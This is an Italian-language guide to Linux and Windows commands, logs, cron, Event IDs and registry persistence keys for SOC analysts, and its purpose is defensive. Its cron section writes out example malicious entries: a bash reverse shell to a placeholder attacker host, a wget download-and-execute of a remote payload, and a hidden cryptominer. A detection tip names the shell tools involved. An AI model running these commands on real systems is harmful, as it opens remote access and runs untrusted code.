# 💻 Sistemi Operativi per SOC Analyst

---

## 🎯 Perché un SOC Analyst deve conoscere i Sistemi Operativi

Un SOC Analyst lavora quotidianamente con sistemi Linux e Windows. La conoscenza profonda di entrambi è **fondamentale** per:

| Area | Motivazione |
|------|-------------|
| **Analisi dei Log** | I log di sistema sono la prima fonte di evidenze. Sapere dove trovarli, come leggerli e come correlarli è la base del lavoro SOC |
| **Forensics e Incident Response** | Durante un incidente, devi navigare il file system, ispezionare processi, analizzare connessioni di rete e raccogliere artefatti — tutto da riga di comando |
| **Comportamento Normale vs Anomalo** | Non puoi riconoscere un'anomalia se non conosci il comportamento legittimo: quali processi devono girare, da quale path, con quale parent |
| **Threat Hunting** | La ricerca proattiva di minacce richiede la capacità di interrogare il sistema: query su log, ricerca file sospetti, analisi delle connessioni attive |
| **Persistenza Malware** | Il malware si nasconde in cron job, task schedulati, chiavi di registro, servizi — devi sapere dove cercare |
| **Escalation di Privilegi** | Comprendere permessi SUID, gruppi, policy di sicurezza per rilevare tentativi di privilege escalation |

> **Regola d'oro**: Un buon SOC Analyst deve essere altrettanto a suo agio su una shell Linux quanto su PowerShell Windows.

---

## 🐧 LINUX per SOC Analyst

Linux è il sistema operativo dominante nei server, nelle appliance di sicurezza (firewall, IDS/IPS, SIEM) e negli strumenti di penetration testing. La maggior parte dell'infrastruttura critica gira su Linux.

---

### 📂 Comandi Essenziali

#### 🧭 Navigazione e Ricerca

##### `ls` — Elencare contenuti di una directory

```bash
# Sintassi
ls [opzioni] [percorso]
```

| Opzione | Descrizione |
|---------|-------------|
| `ls -la` | Lista dettagliata con file nascosti (dotfiles) |
| `ls -lah` | Lista dettagliata con dimensioni leggibili (KB, MB, GB) |
| `ls -lt` | Lista ordinata per data di modifica (più recente prima) |

**Esempi SOC:**

```bash
# Cercare file nascosti in una home compromessa
ls -la /home/utente_sospetto/

# Vedere gli ultimi file modificati in /tmp (area ad alto rischio)
ls -lt /tmp/

# Controllare i permessi di file sensibili
ls -la /etc/shadow /etc/passwd
```

##### `cd` — Cambiare directory

```bash
cd /var/log           # Vai ai log di sistema
cd ~                  # Vai alla home directory
cd ..                 # Vai alla directory padre
cd -                  # Torna alla directory precedente
```

##### `pwd` — Stampare la directory corrente

```bash
pwd
# Output: /var/log/apache2
```

##### `find` — Ricerca avanzata di file

```bash
# Sintassi
find [percorso] [opzioni] [espressione]
```

**Esempi SOC:**

```bash
# Trovare file .exe creati nelle ultime 24 ore (possibile malware)
find / -name "*.exe" -mtime -1 2>/dev/null

# Trovare file con bit SUID attivo (potenziale privilege escalation)
find / -perm -4000 -type f 2>/dev/null

# Trovare file modificati negli ultimi 30 minuti (durante un incidente)
find / -mmin -30 -type f 2>/dev/null

# Trovare file di grandi dimensioni in /tmp (possibile esfiltrazione dati)
find /tmp -size +100M -type f 2>/dev/null

# Trovare file world-writable (rischio sicurezza)
find / -perm -0002 -type f 2>/dev/null

# Trovare file appartenenti a root ma scrivibili da tutti
find / -user root -perm -o+w -type f 2>/dev/null
```

##### `locate` — Ricerca rapida tramite database indicizzato

```bash
# Aggiornare il database (necessario prima dell'uso)
sudo updatedb

# Cercare un file
locate passwd
locate "*.log"
```

> ⚠️ `locate` è più veloce di `find` ma usa un database che potrebbe non essere aggiornato. In ambito forense, preferisci `find`.

---

#### 📝 Manipolazione e Analisi File

##### `cat` — Visualizzare il contenuto di un file

```bash
# Leggere un file di log
cat /var/log/auth.log

# Concatenare più file
cat access.log.1 access.log.2 > combined_access.log
```

##### `head` / `tail` — Inizio e fine di un file

```bash
# Prime 20 righe di un log
head -20 /var/log/syslog

# Ultime 50 righe
tail -50 /var/log/auth.log

# ⭐ Seguire un log in TEMPO REALE (fondamentale durante un incidente!)
tail -f /var/log/auth.log

# Seguire più file contemporaneamente
tail -f /var/log/syslog /var/log/auth.log
```

##### `less` — Visualizzazione paginata

```bash
less /var/log/syslog
# Comandi interni: / per cercare, n per prossimo risultato, q per uscire
```

##### `grep` — Ricerca di pattern (IL COMANDO PIÙ IMPORTANTE PER UN SOC ANALYST)

```bash
# Sintassi
grep [opzioni] "pattern" file
```

| Opzione | Descrizione |
|---------|-------------|
| `-i` | Case insensitive |
| `-r` | Ricerca ricorsiva nelle directory |
| `-E` | Extended regex (equivalente a egrep) |
| `-c` | Conta le occorrenze invece di mostrarle |
| `-v` | Inverte la ricerca (mostra righe che NON corrispondono) |
| `-n` | Mostra il numero di riga |
| `-l` | Mostra solo i nomi dei file che contengono il pattern |
| `-A N` | Mostra N righe dopo il match |
| `-B N` | Mostra N righe prima del match |

**Esempi SOC:**

```bash
# Cercare tentativi di login falliti
grep -i "failed" /var/log/auth.log

# Cercare un IP sospetto in tutti i log
grep -r "192.168.1.100" /var/log/

# Cercare connessioni SSH (riuscite e fallite)
grep -E "Accepted|Failed" /var/log/auth.log

# Contare i tentativi di brute-force
grep -c "Failed password" /var/log/auth.log

# Cercare comandi sudo sospetti
grep "sudo" /var/log/auth.log | grep -v "session opened"

# Cercare richieste SQL injection nei log web
grep -E "(UNION|SELECT|DROP|INSERT|UPDATE|DELETE|--|;)" /var/log/apache2/access.log
```

##### `awk` — Estrazione e manipolazione colonne

```bash
# Estrarre gli IP dai log Apache (colonna 1)
awk '{print $1}' /var/log/apache2/access.log

# Estrarre IP e status code (colonna 1 e 9)
awk '{print $1, $9}' /var/log/apache2/access.log

# Filtrare solo le risposte 404 (possibile directory enumeration)
awk '$9 == 404 {print $1, $7}' /var/log/apache2/access.log

# Filtrare righe dove la colonna 9 è >= 500 (errori server)
awk '$9 >= 500' /var/log/apache2/access.log
```

##### `sed` — Stream Editor

```bash
# Sostituire un testo
sed 's/vecchio/nuovo/g' file.txt

# Rimuovere righe vuote
sed '/^$/d' log.txt

# Estrarre righe tra due timestamp
sed -n '/2024-01-15 08:00/,/2024-01-15 09:00/p' syslog
```

##### `cut` — Tagliare parti di ogni riga

```bash
# Estrarre il primo campo delimitato da ':'
cut -d':' -f1 /etc/passwd

# Estrarre username e shell dal file passwd
cut -d':' -f1,7 /etc/passwd
```

##### `sort` — Ordinare righe

```bash
sort file.txt          # Ordine alfabetico
sort -n file.txt       # Ordine numerico
sort -rn file.txt      # Ordine numerico decrescente
sort -u file.txt       # Rimuovi duplicati durante l'ordinamento
```

##### `uniq` — Rimuovere duplicati e contarli

```bash
# ⚠️ uniq funziona solo su dati ORDINATI, quindi si usa con sort

# Contare occorrenze uniche
sort file.txt | uniq -c

# Mostrare solo le righe duplicate
sort file.txt | uniq -d
```

##### `wc` — Contare righe, parole, caratteri

```bash
wc -l /var/log/auth.log     # Contare righe
wc -w file.txt              # Contare parole
wc -c file.txt              # Contare byte
```

##### ⭐ Pipeline Completa — Analisi IP più frequenti nei log

Questa è una delle pipeline più utilizzate in ambito SOC per identificare gli IP che generano più traffico:

```bash
# Top 20 IP che hanno fatto più richieste al web server
cat /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
```

**Spiegazione passo dopo passo:**

| Step | Comando | Cosa fa |
|------|---------|---------|
| 1 | `cat access.log` | Legge il file di log |
| 2 | `awk '{print $1}'` | Estrae la prima colonna (indirizzo IP) |
| 3 | `sort` | Ordina gli IP alfabeticamente (necessario per `uniq`) |
| 4 | `uniq -c` | Conta le occorrenze di ogni IP univoco |
| 5 | `sort -rn` | Ordina per conteggio decrescente |
| 6 | `head -20` | Mostra i primi 20 risultati |

**Altre pipeline utili:**

```bash
# Top 10 URL più richieste (possibile scan/enumeration)
cat access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -10

# Contare tentativi di login falliti per utente
grep "Failed password" /var/log/auth.log | awk '{print $9}' | sort | uniq -c | sort -rn

# IP con più errori 404 (possibile directory brute-force)
awk '$9 == 404 {print $1}' access.log | sort | uniq -c | sort -rn | head -10

# Estrarre User-Agent unici (identificare bot/scanner)
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head -20
```

---

#### 🌐 Comandi di Rete

##### `ifconfig` / `ip addr show` — Configurazione interfacce di rete

```bash
# Vecchio comando (deprecato ma ancora comune)
ifconfig

# Nuovo comando (preferito)
ip addr show
ip a               # Abbreviazione

# Mostrare solo un'interfaccia
ip addr show eth0
```

##### `netstat` / `ss` — Connessioni di rete attive

```bash
# Vecchio comando
netstat -tulnp
# -t: TCP, -u: UDP, -l: listening, -n: numerico, -p: processo

# Nuovo comando (più veloce)
ss -tulnp

# Vedere tutte le connessioni stabilite
ss -tnp state established

# Cercare connessioni su una porta specifica
ss -tulnp | grep ":4444"     # Porta tipica di Metasploit
ss -tulnp | grep ":443"
```

##### `ping` — Test di raggiungibilità

```bash
ping -c 4 8.8.8.8          # Inviare 4 pacchetti
ping -c 1 target.com        # Singolo ping per verificare DNS
```

##### `traceroute` — Tracciare il percorso dei pacchetti

```bash
traceroute 8.8.8.8
traceroute -n target.com     # Senza risoluzione DNS (più veloce)
```

##### `nslookup` / `dig` — Risoluzione DNS

```bash
# nslookup (più semplice)
nslookup suspicious-domain.com
nslookup -type=MX domain.com

# dig (più dettagliato, preferito in ambito SOC)
dig suspicious-domain.com
dig suspicious-domain.com ANY         # Tutti i record
dig -x 192.168.1.100                  # Reverse DNS lookup
dig +short suspicious-domain.com       # Output compatto
```

##### `tcpdump` — Cattura traffico di rete (ESSENZIALE per SOC)

```bash
# Catturare tutto il traffico su un'interfaccia
sudo tcpdump -i eth0

# Catturare traffico su una porta specifica
sudo tcpdump -i eth0 port 80

# Filtrare per IP sorgente
sudo tcpdump -i eth0 src 192.168.1.100

# Filtrare per IP destinazione
sudo tcpdump -i eth0 dst 10.0.0.5

# Catturare solo pacchetti SYN (scan detection)
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Salvare la cattura in un file PCAP per analisi con Wireshark
sudo tcpdump -i eth0 -w cattura.pcap

# Catturare traffico DNS (utile per rilevare DNS tunneling)
sudo tcpdump -i eth0 port 53

# Catturare traffico sospetto su porte non standard
sudo tcpdump -i eth0 'port 4444 or port 1337 or port 31337'

# Leggere un file PCAP salvato
tcpdump -r cattura.pcap

# Limitare la cattura a 100 pacchetti
sudo tcpdump -i eth0 -c 100 port 443
```

##### `nmap` — Network Scanner

```bash
# SYN scan (stealth, il più usato)
nmap -sS 192.168.1.0/24

# Scan versioni servizi
nmap -sV 192.168.1.100

# Rilevamento OS
nmap -O 192.168.1.100

# Scan aggressivo (OS + versioni + script + traceroute)
nmap -A 192.168.1.100

# Scan di una porta specifica
nmap -p 22,80,443 192.168.1.100

# Scan di tutte le porte
nmap -p- 192.168.1.100

# Scan rapido delle prime 100 porte
nmap -F 192.168.1.100

# Scan con script NSE per vulnerabilità
nmap --script vuln 192.168.1.100
```

##### `curl` / `wget` — Richieste HTTP

```bash
# Scaricare una pagina e visualizzarla
curl https://suspicious-site.com

# Vedere solo gli header HTTP
curl -I https://suspicious-site.com

# Seguire redirect
curl -L https://short-url.com/abc

# Scaricare un file
wget https://example.com/malware-sample.zip

# Verificare se un URL è attivo (senza scaricare)
curl -s -o /dev/null -w "%{http_code}" https://suspicious-site.com
```

---

#### ⚙️ Gestione Processi

##### `ps aux` — Elencare tutti i processi

```bash
# Mostrare tutti i processi con dettagli
ps aux

# Cercare un processo specifico
ps aux | grep "python"
ps aux | grep -v grep | grep "nc -l"     # Escludere il grep stesso

# Mostrare processi in formato albero (vedere parent-child)
ps auxf

# Mostrare processi di un utente specifico
ps -u www-data
```

##### `top` / `htop` — Monitoraggio processi in tempo reale

```bash
top            # Visualizzazione base
htop           # Visualizzazione migliorata con colori (installare con apt)
```

> **SOC Tip:** Un processo con CPU/RAM insolitamente alta potrebbe essere un cryptominer o un processo malevolo.

##### `kill` — Terminare processi

```bash
kill PID            # Terminazione normale (SIGTERM)
kill -9 PID         # Terminazione forzata (SIGKILL) - usa solo se necessario
kill -STOP PID      # Sospendere un processo (utile in forensics per preservare)

# Terminare tutti i processi con un certo nome
killall processo_sospetto
```

##### `lsof` — File e connessioni aperti da un processo

```bash
# Mostrare tutti i file aperti dal processo con PID 1234
lsof -p 1234

# ⭐ Mostrare tutte le connessioni di rete
lsof -i

# Connessioni su una porta specifica
lsof -i :4444

# Connessioni TCP stabilite
lsof -i TCP -s TCP:ESTABLISHED

# File aperti da un utente
lsof -u www-data
```

---

#### 👤 Gestione Utenti

```bash
# Chi sono io?
whoami

# Informazioni dettagliate sull'utente corrente
id
# Output: uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)

# Chi è connesso al sistema?
who
w              # Più dettagliato, mostra anche cosa stanno facendo

# Cronologia degli ultimi login
last
last -n 20          # Ultimi 20 login
last -f /var/log/wtmp

# Ultimo login di ogni utente
lastlog

# Cambiare password
passwd
sudo passwd username     # Cambiare la password di un altro utente
```

##### Struttura di `/etc/passwd`

```
username:x:UID:GID:commento:home_directory:shell
```

```bash
# Esempio
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
hacker:x:1001:1001::/home/hacker:/bin/bash
```

| Campo | Descrizione | Red Flag |
|-------|-------------|----------|
| Username | Nome utente | Nomi sospetti o generici |
| x | Password in /etc/shadow | Se vuoto = no password! |
| UID | User ID | UID 0 = root (chi ha UID 0 oltre root?) |
| GID | Group ID | Gruppi privilegiati |
| Commento | Descrizione | Spesso vuoto per utenti creati da malware |
| Home | Directory home | Path insoliti |
| Shell | Shell assegnata | `/bin/bash` su account di servizio è sospetto |

##### Struttura di `/etc/shadow`

```
username:password_hash:last_changed:min:max:warn:inactive:expire
```

```bash
# Esempio
root:$6$abc123...:19500:0:99999:7:::
hacker:$6$xyz789...:19550:0:99999:7:::
```

> **SOC Tip:** Controlla utenti con UID 0, account con shell attive che non dovrebbero averle, e hash password vuoti.

---

#### 🔐 Permessi

##### `chmod` — Modificare i permessi

**Notazione numerica:**

| Valore | Permesso |
|--------|----------|
| 4 | Lettura (r) |
| 2 | Scrittura (w) |
| 1 | Esecuzione (x) |

```bash
chmod 777 file     # rwxrwxrwx - TUTTI possono fare tutto (PERICOLOSO!)
chmod 755 script   # rwxr-xr-x - Owner tutto, altri leggono/eseguono
chmod 644 file     # rw-r--r-- - Owner legge/scrive, altri solo leggono
chmod 600 key.pem  # rw------- - Solo l'owner legge/scrive (per chiavi SSH)
```

**Notazione simbolica:**

```bash
chmod u+x script.sh     # Aggiungi esecuzione al proprietario
chmod g-w file.txt       # Rimuovi scrittura al gruppo
chmod o-rwx secret.txt   # Rimuovi tutti i permessi agli altri
chmod a+r readme.txt     # Aggiungi lettura a tutti
```

##### `chown` — Cambiare proprietario

```bash
chown root:root file.txt
chown -R www-data:www-data /var/www/
```

##### Permessi Speciali (Importantissimi per Sicurezza)

| Bit | Valore | Nome | Rischio |
|-----|--------|------|---------|
| **SUID** | 4 | Set User ID | Il file viene eseguito con i permessi del **proprietario** (spesso root). Se sfruttato → privilege escalation |
| **SGID** | 2 | Set Group ID | Il file viene eseguito con i permessi del **gruppo**. Sulle directory, i nuovi file ereditano il gruppo |
| **Sticky Bit** | 1 | Sticky | Solo il proprietario può cancellare i propri file nella directory (usato su /tmp) |

```bash
# Trovare tutti i file SUID (potenziali vettori di privilege escalation)
find / -perm -4000 -type f 2>/dev/null

# Trovare file SGID
find / -perm -2000 -type f 2>/dev/null

# Controllare i permessi SUID
ls -la /usr/bin/passwd
# -rwsr-xr-x → la "s" indica SUID attivo
```

> **SOC Tip:** Un file SUID non standard (es. `/tmp/exploit`) è un fortissimo indicatore di compromissione.

---

#### 🖥️ Informazioni di Sistema

```bash
# Informazioni complete sul sistema operativo e kernel
uname -a
# Output: Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64

# Spazio su disco (human-readable)
df -h

# Dimensione di una directory
du -sh /var/log/

# Memoria RAM disponibile
free -h

# Uptime del sistema
uptime
# Output: 14:30:22 up 45 days, 3:22, 2 users, load average: 0.15, 0.10, 0.05

# Log del kernel (utile per rilevare moduli caricati, errori hardware, rootkit)
dmesg | tail -50
```

---

### 📄 File di Log Importanti

I log sono la **linfa vitale** di un SOC Analyst. Sapere dove trovarli e cosa contengono è fondamentale.

| File | Cosa Contiene | Uso nel SOC |
|------|---------------|-------------|
| `/var/log/syslog` | Log generale del sistema (Debian/Ubuntu) | Panoramica attività sistema, errori, avvii servizi |
| `/var/log/auth.log` | Autenticazione: login, sudo, SSH (Debian/Ubuntu) | Rilevamento brute-force, accessi non autorizzati, escalation privilegi |
| `/var/log/secure` | Equivalente di auth.log (RHEL/CentOS) | Stessa funzione su distribuzioni Red Hat |
| `/var/log/kern.log` | Messaggi del kernel | Moduli caricati, errori hardware, possibili rootkit |
| `/var/log/apache2/access.log` | Richieste HTTP ad Apache | Analisi attacchi web: SQLi, XSS, directory traversal, scansioni |
| `/var/log/apache2/error.log` | Errori Apache | Errori applicativi, tentativi di exploit falliti |
| `/var/log/nginx/access.log` | Richieste HTTP a Nginx | Come Apache access.log |
| `/var/log/fail2ban.log` | IP bannati da Fail2Ban | Monitoraggio attacchi bloccati, verifica che Fail2Ban funzioni |
| `/var/log/cron` | Esecuzioni cron job | Cron job non autorizzati, persistenza malware |
| `/var/log/mail.log` | Attività server email | Phishing, spam, esfiltrazione via email |
| `/var/log/btmp` | Tentativi di login falliti (binario) | Leggere con `lastb`, brute-force detection |
| `/var/log/wtmp` | Cronologia login (binario) | Leggere con `last`, tracciamento accessi |

##### `journalctl` — Log centralizzati con systemd

```bash
# Mostrare tutti i log
journalctl

# Log del boot corrente
journalctl -b

# Log di un servizio specifico
journalctl -u sshd
journalctl -u apache2

# Log da un certo timestamp
journalctl --since "2024-01-15 08:00" --until "2024-01-15 18:00"

# Seguire i log in tempo reale
journalctl -f

# Solo messaggi di errore e superiori
journalctl -p err

# Log in formato JSON (utile per parsing automatico)
journalctl -o json-pretty
```

---

### ⏰ Cron Job e Crontab

I cron job sono task pianificati che vengono eseguiti automaticamente. Sono uno dei metodi più comuni di **persistenza malware** su Linux.

#### Formato Crontab

```
┌───────────── minuto (0-59)
│ ┌───────────── ora (0-23)
│ │ ┌───────────── giorno del mese (1-31)
│ │ │ ┌───────────── mese (1-12)
│ │ │ │ ┌───────────── giorno della settimana (0-7, 0=7=domenica)
│ │ │ │ │
* * * * * comando_da_eseguire
```

**Esempi:**

```bash
# Ogni minuto
* * * * * /script.sh

# Ogni giorno alle 3:00 di notte
0 3 * * * /backup.sh

# Ogni lunedì alle 8:00
0 8 * * 1 /report.sh
```

#### Come visualizzare i cron job

```bash
# Crontab dell'utente corrente
crontab -l

# Crontab di un utente specifico
sudo crontab -l -u www-data

# Cron job di sistema
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
cat /etc/crontab
```

#### 🚨 Abuso per Persistenza Malware

```bash
# Esempio di cron job malevolo: reverse shell ogni minuto
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'

# Esempio: download ed esecuzione di payload
*/5 * * * * wget -q http://malicious-site.com/payload.sh -O /tmp/.hidden.sh && chmod +x /tmp/.hidden.sh && /tmp/.hidden.sh

# Esempio: cryptominer che si riavvia
@reboot /tmp/.xmrig --donate-level 0 -o pool.mining.com:3333
```

> **SOC Tip:** Controlla SEMPRE i crontab di tutti gli utenti durante un'indagine. Cerca comandi con `wget`, `curl`, `bash -i`, `/dev/tcp`, codifica base64, e path in `/tmp` o directory nascoste.

---

### 📁 File System Linux

```
/                           # Root - radice del file system
├── /bin                    # Binari essenziali (ls, cp, cat, grep...)
├── /sbin                   # Binari di sistema/amministrazione (iptables, fdisk...)
├── /etc                    # ⭐ File di configurazione del sistema
│   ├── passwd              # Database utenti
│   ├── shadow              # Hash password
│   ├── crontab             # Cron job di sistema
│   ├── ssh/                # Configurazione SSH
│   └── sudoers             # Chi può usare sudo
├── /home                   # Directory home degli utenti
├── /var                    # File variabili (log, cache, spool)
│   ├── /var/log            # ⭐ FILE DI LOG
│   ├── /var/www            # Root del web server
│   └── /var/tmp            # File temporanei persistenti
├── /tmp                    # ⚠️ File temporanei (chiunque può scrivere!)
├── /usr                    # Programmi utente
│   ├── /usr/bin            # Binari utente
│   ├── /usr/sbin           # Binari amministrativi
│   └── /usr/local          # Software installato localmente
├── /opt                    # Software di terze parti
├── /proc                   # ⭐ File system virtuale (info processi e kernel)
│   ├── /proc/[PID]         # Info su un processo specifico
│   ├── /proc/net           # Info rete (connessioni attive)
│   └── /proc/version       # Versione kernel
├── /dev                    # Dispositivi (dischi, terminali...)
│   └── /dev/null           # "Buco nero" - scarta l'output
└── /boot                   # File di avvio (kernel, GRUB)
```

#### Directory Rilevanti per la Sicurezza

| Directory | Rilevanza Sicurezza |
|-----------|---------------------|
| `/tmp`, `/var/tmp`, `/dev/shm` | Malware spesso si nasconde qui perché sono world-writable |
| `/etc/passwd`, `/etc/shadow` | Account utente e password hash — target di attaccanti |
| `/etc/ssh/` | Chiavi SSH autorizzate, configurazione — accesso persistente |
| `/home/*/.ssh/authorized_keys` | Chiavi SSH degli utenti — controllare per chiavi non autorizzate |
| `/home/*/.bash_history` | Cronologia comandi — può rivelare attività malevola |
| `/var/log/` | Log di sistema — prime evidenze in un incidente |
| `/proc/` | Informazioni su processi in esecuzione — analisi live |
| `/etc/crontab`, `/var/spool/cron/` | Task pianificati — persistenza malware |
| `/etc/rc.local`, `/etc/init.d/` | Script di avvio — persistenza malware |
| `/root/` | Home di root — file lasciati da attaccanti con accesso root |

---

## 🪟 WINDOWS per SOC Analyst

Windows è il sistema operativo più diffuso nelle reti aziendali. La maggior parte degli endpoint e molti server utilizzano Windows, rendendolo il target principale degli attacchi informatici.

---

### 💻 Comandi CMD

```cmd
:: Configurazione di rete completa
ipconfig /all

:: Connessioni di rete con PID del processo
netstat -ano
netstat -ano | findstr "ESTABLISHED"
netstat -ano | findstr ":4444"

:: Lista processi attivi
tasklist
tasklist /svc              :: Mostra i servizi associati a ogni processo
tasklist | findstr "svchost"

:: Terminare un processo
taskkill /PID 1234 /F      :: /F = force

:: Informazioni dettagliate sul sistema
systeminfo
systeminfo | findstr /B /C:"OS" /C:"System" /C:"Hotfix"

:: Informazioni processi tramite WMIC
wmic process list full
wmic process where "name='powershell.exe'" get processid,parentprocessid,commandline

:: Programmi in avvio automatico
wmic startup list full

:: Gestione utenti
net user                              :: Lista utenti
net user administrator                :: Dettagli utente
net localgroup administrators         :: Membri del gruppo Administrators

:: Task schedulati
schtasks /query /fo LIST /v

:: Ricerca file ricorsiva
dir /s /b C:\Users\*.exe              :: Cerca tutti i .exe
dir /s /b C:\Temp\*                   :: Contenuto cartella Temp
dir /a:h C:\Users\                    :: File nascosti
```

---

### 🔷 PowerShell per SOC

PowerShell è lo strumento più potente per l'analisi e l'incident response su Windows.

#### Processi e Servizi

```powershell
# Lista processi con dettagli
Get-Process
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

# Processi con percorso eseguibile (identificare mascheramento)
Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize

# Servizi
Get-Service
Get-Service | Where-Object {$_.Status -eq "Running"}
```

#### Analisi Log (Event Log)

```powershell
# Ultimi 50 eventi dal log Security
Get-EventLog -LogName Security -Newest 50

# ⭐ Cercare login falliti (Event ID 4625)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}

# Cercare login riusciti (Event ID 4624)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
    Select-Object TimeCreated, Message -First 20

# Cercare creazione di nuovi utenti (Event ID 4720)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720}

# Cercare installazione di nuovi servizi (Event ID 7045)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045}

# Cercare cancellazione dei log (Event ID 1102) — ALTAMENTE SOSPETTO
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102}
```

#### Connessioni di Rete

```powershell
# Connessioni TCP attive con processo associato
Get-NetTCPConnection |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess |
    Format-Table -AutoSize

# Connessioni stabilite verso l'esterno
Get-NetTCPConnection -State Established |
    Where-Object {$_.RemoteAddress -notmatch "^(127\.|0\.0\.0|::)"} |
    Select-Object RemoteAddress, RemotePort, OwningProcess

# Test di connettività
Test-NetConnection -ComputerName suspicious-domain.com -Port 443
```

#### File System

```powershell
# Ricerca ricorsiva con file nascosti
Get-ChildItem -Path C:\Users\ -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object {$_.Extension -eq ".exe"} |
    Select-Object FullName, CreationTime, LastWriteTime

# Cercare file modificati nelle ultime 24 ore
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)} |
    Select-Object FullName, LastWriteTime
```

#### Task Schedulati e Avvio Automatico

```powershell
# Tutti i task schedulati
Get-ScheduledTask
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} |
    Select-Object TaskName, TaskPath, State

# Dettagli di un task specifico
Get-ScheduledTask -TaskName "NomeTask" | Get-ScheduledTaskInfo

# ⭐ Chiavi di registro di avvio automatico (persistenza!)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

---

### 📊 Event Viewer

L'Event Viewer (Visualizzatore Eventi) è lo strumento nativo di Windows per visualizzare i log di sistema. È accessibile da:
- `eventvwr.msc` (da Esegui o cmd)
- Pannello di Controllo → Strumenti di Amministrazione → Visualizzatore Eventi

#### Struttura Log

| Log | Contenuto |
|-----|-----------|
| **Application** | Eventi generati dalle applicazioni |
| **Security** | ⭐ Autenticazione, autorizzazione, audit (il più importante per SOC) |
| **System** | Eventi del sistema operativo, driver, servizi |
| **Setup** | Installazione e aggiornamenti Windows |
| **Forwarded Events** | Eventi ricevuti da altri computer (quando configurato il forwarding) |

#### 🔑 Event ID Critici per SOC Analyst

| Event ID | Log | Descrizione | Importanza SOC |
|----------|-----|-------------|----------------|
| **4624** | Security | **Login riuscito** | Monitorare login da IP/orari anomali. Controllare il Logon Type |
| **4625** | Security | **Login fallito** | Indicatore di brute-force. Molti 4625 seguiti da un 4624 = compromissione |
| **4634** | Security | **Logoff** | Correlazione con login per determinare durata sessione |
| **4648** | Security | **Login con credenziali esplicite** | Lateral movement con `runas` o credential stuffing |
| **4672** | Security | **Assegnazione privilegi speciali** | Login con privilegi admin — controllare se autorizzato |
| **4688** | Security | **Creazione nuovo processo** | ⭐ Fondamentale per ricostruire la catena di esecuzione (richiede audit abilitato) |
| **4697** | Security | **Installazione servizio** | Persistenza tramite servizi — verificare il servizio installato |
| **4698** | Security | **Task schedulato creato** | Persistenza tramite task scheduler |
| **4720** | Security | **Account utente creato** | Attaccante che crea backdoor account |
| **7045** | System | **Nuovo servizio installato** | Come 4697 ma nel log System — doppia verifica |
| **1102** | Security | **Log di audit cancellato** | 🚨 **ALTISSIMA PRIORITÀ** — tentativo di distruzione evidenze |

#### Logon Types (Event ID 4624)

| Logon Type | Descrizione | Rilevanza |
|------------|-------------|-----------|
| **2** | Interactive (login locale) | Login fisico alla macchina |
| **3** | Network | Accesso a condivisioni di rete, SMB |
| **4** | Batch | Task schedulati |
| **5** | Service | Avvio di un servizio |
| **7** | Unlock | Sblocco di una sessione precedentemente bloccata |
| **8** | NetworkCleartext | Password inviata in chiaro sulla rete (⚠️) |
| **9** | NewCredentials | Clonazione del token corrente con nuove credenziali per connessioni in uscita |
| **10** | RemoteInteractive | Login tramite RDP (Remote Desktop) |
| **11** | CachedInteractive | Login con credenziali cached (senza contattare il domain controller) |

> **SOC Tip:** Un Logon Type 10 da un IP esterno o a orari insoliti è un forte indicatore di compromissione. Logon Type 3 massivo tra server interni può indicare lateral movement.

---

### 🔑 Registry di Windows

Il Registry è un database gerarchico che contiene le configurazioni di Windows, dei programmi e degli utenti. È uno dei luoghi preferiti dal malware per stabilire **persistenza**.

#### Struttura del Registry

| Hive (Alveare) | Abbreviazione | Contenuto |
|-----------------|---------------|-----------|
| **HKEY_LOCAL_MACHINE** | HKLM | Configurazioni del computer (hardware, software, sicurezza) |
| **HKEY_CURRENT_USER** | HKCU | Configurazioni dell'utente corrente |
| **HKEY_CLASSES_ROOT** | HKCR | Associazioni file e oggetti COM |
| **HKEY_USERS** | HKU | Profili di tutti gli utenti |
| **HKEY_CURRENT_CONFIG** | HKCC | Configurazione hardware corrente |

#### ⚠️ Chiavi di Persistenza Malware

Queste sono le chiavi di registro che **DEVI** controllare durante un'indagine:

```
:: Autorun — Programmi eseguiti al login
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

:: Servizi (il malware può registrarsi come servizio)
HKLM\SYSTEM\CurrentControlSet\Services

:: Winlogon (eseguito durante il processo di login)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  → Chiavi: Shell, Userinit

:: Explorer (DLL caricate da Explorer)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects

:: AppInit_DLLs (DLL iniettate in tutti i processi che usano user32.dll)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

:: Image File Execution Options (IFEO — hijacking di processi)
